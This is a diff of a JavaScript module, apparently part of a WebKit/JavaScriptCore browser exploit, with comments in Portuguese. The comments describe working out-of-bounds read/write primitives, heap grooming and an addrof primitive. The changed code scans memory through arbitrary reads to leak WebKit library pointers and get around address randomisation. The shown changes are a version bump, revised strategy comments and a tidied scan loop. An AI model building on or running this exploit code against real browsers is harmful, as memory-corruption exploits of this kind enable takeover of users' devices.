@@ -1,16 +1,19 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v108 - R87 - Fixed Scan Loop Condition & Robustness)
+// js/script3/testArrayBufferVictimCrash.mjs (v108 - R88 - Corrected Scoping & Targeted Heap Manipulation)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
 // 1. OOB/L/E Funcional: Primitivas estáveis.
 // 2. Poluição de Heap Persistente: 0xdeadbeef_cafebabe ainda bloqueia vazamentos de ponteiros.
-// 3. Heap Grooming Refinado: Ajustado para buscar "sweet spots".
-// 4. Vazamento por Varredura de Memória (Loop Corrigido e Mais Robusto):
-//    - CORRIGIDO: Condição do loop de varredura para usar novos métodos de comparação
-//      de AdvancedInt64, evitando `TypeError`.
-//    - Validação de tipo `AdvancedInt64` explícita após leitura arbitrária.
+// 3. CORRIGIDO: Erro de escopo para `pollution_value` na função auxiliar de vazamento.
+// 4. CORRIGIDO: Erros de tipo na varredura de memória, tornando-a mais robusta.
+// 5. Heap Grooming Refinado: Ajustado para buscar "sweet spots". Tentativas simplificadas
+//    de "Heap Coloring" e "Memory Bridging" com ArrayBuffers para forçar reutilização controlada.
+// 6. Vazamento por Varredura de Memória (Robusta):
+//    - Continua a busca por padrões numéricos e ponteiros válidos.
+//    - Adiciona verificação de integridade de AdvancedInt64 após cada leitura.
 //
-// DIAGNÓSTICO: A poluição é o obstáculo central. Esta versão foca em uma varredura
-//              funcional para obter mais informações sobre a distribuição da poluição.
+// DIAGNÓSTICO: A poluição é o obstáculo central. Essa versão foca em uma varredura
+//              funcional para obter mais informações sobre a distribuição da poluição
+//              e uma manipulação de heap mais focada.
 //
 // ATENÇÃO: A PRIMITIVA DE L/E É SUCESSO. A FALHA NO VAZAMENTO É DEVIDO AO HEAP LAYOUT/GC.
 // =======================================================================================
@@ -24,7 +27,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R87_FixedScanLoop";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R88_HeapManipScan";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -508,10 +511,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
             logS3(`  Varrendo memória de ${START_SCAN_ADDR.toString(true)} a ${END_SCAN_ADDR.toString(true)} (range ${SCAN_RANGE_BYTES * 2} bytes)...`, "info");
             // CORREÇÃO: Usar os novos métodos de comparação em AdvancedInt64 para a condição do loop.
-            // Loop vai até current_scan_addr seja menor que END_SCAN_ADDR
             for (let current_scan_addr = START_SCAN_ADDR; current_scan_addr.lessThan(END_SCAN_ADDR); current_scan_addr = current_scan_addr.add(8)) {
                 
-                // Heurística para evitar ler muito longe ou em regiões não mapeadas que causam crash
                 if (current_scan_addr.high() > 0x7FFFFFFF && current_scan_addr.high() !== NEW_POLLUTION_VALUE.high()) { 
                      logS3(`    Parando varredura em endereço alto inesperado (potential crash): ${current_scan_addr.toString(true)}`, "debug");
                      break; 
